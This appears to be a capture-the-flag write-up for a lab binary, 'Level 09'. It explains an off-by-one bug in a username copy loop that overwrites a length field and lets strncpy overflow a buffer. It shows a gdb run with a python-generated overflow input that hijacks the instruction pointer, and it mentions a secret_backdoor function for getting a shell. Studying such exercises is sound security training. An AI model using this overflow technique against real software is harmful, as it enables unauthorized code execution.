# Level 09

This level asks for a username then for a password, this data is stored in a
structure like this:

```c
typedef struct data {
	char	msg[140];
	char	usr[40];
	int		msg_length;
}	data;
```

The data is well written into memory, except for one little mistake.
The copy of the username (`data.usr`) is done before the message (`data.msg`).
This wouldn't be a problem, but the copying code copies one byte over the size of
the username string.

```c
for (i = 0; i <= 40 && s[i]; ++i)
	d->usr[i] = s[i];
```

The condition of the loop should be `i < 40 && s[i]` instead of `i <= 40 && s[i]`.
This little misteak makes it copy up to 41 bytes instead of 40.
The byte that is overflowing is overwriting the `data.msg_length` variable.
This is a big mistake considering that this is the variable that is checked
for the length of the message string.

```c
return strncpy(d->msg, s, d->msg_length);
```

This means that we have one byte to play with. Meaning that we can potentially
copy up to 255 bytes, this is 115 more than the intended and could cause memory
issues.

```gdb
(gdb) r < <(python -c 'print("\xff" * 2048)')
Starting program: /home/users/level09/level09 < <(python -c 'print("\xff" * 2048)')

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) c
Continuing.
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0xffffffffffffffff in ?? ()
```

Spot on, the program segfaults as we want. Now we need to find an address to go to.
Fortunately there is a `secret_backdoor` function that let us use a shell :)